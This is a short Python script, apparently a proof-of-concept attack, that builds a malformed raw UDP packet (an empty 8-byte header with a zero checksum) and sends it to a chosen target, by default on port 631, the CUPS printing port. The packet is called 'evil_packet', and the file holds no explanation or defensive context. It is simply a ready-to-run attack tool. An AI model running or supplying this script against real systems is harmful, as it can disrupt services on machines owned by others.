import socket
import struct
from optparse import OptionParser

parser = OptionParser()
parser.add_option('-t', '--target', dest='target')
parser.add_option('-s', '--source-port', dest='source_port', default=4321)
parser.add_option('-P', '--destination-port', dest='destination_port', default=631)

(options, args) = parser.parse_args()

sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
target_address = options.target

def buildPacket():

    source_port = options.source_port
    destination_port = options.destination_port
    length = 8
    checksum = 0

    udp_header = struct.pack('!HHHH', source_port, destination_port, length, checksum)

    return udp_header


def sendPayload(udp_header):
    sock.sendto(udp_header,(target_address, 0))

evil_packet = buildPacket()
sendPayload(evil_packet)
